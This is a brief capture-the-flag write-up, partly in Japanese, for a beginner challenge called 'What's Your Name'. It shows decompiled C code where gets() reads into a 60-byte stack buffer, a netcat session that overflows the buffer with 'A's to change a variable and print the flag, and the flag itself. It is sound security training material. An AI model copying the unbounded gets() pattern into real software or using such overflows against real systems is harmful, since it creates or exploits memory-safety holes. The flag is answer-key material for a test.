# What's Your Name

## description

Let us know your good name.

Flag Format : KCTF{S0m3_T3xT_H3r3}

Author : NomanProdhan

## writeup

ghidraで配布されたバイナリを見て、`local_c`を書き換えれば良いと判断しました。
スタック上の値を書き換える手法として、BOFを試すと成功しました。

```C
undefined8 main(void){
  char local_48 [60];
  int local_c;
  
  local_c = 100;
  printf("What\'s your name ? ");
  fflush(stdout);
  gets(local_48);
  printf("Welcome %s \n",local_48);
  fflush(stdout);
  if (local_c != 100) {
    system("cat /home/hacker/flag.txt");
  }
  return 0;
}
```

```bash
% nc 
What's your name ? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
KCTF{bAbY_bUfF3r_0v3Rf1Ow}
```

## FLAG

```txt
KCTF{bAbY_bUfF3r_0v3Rf1Ow}
```
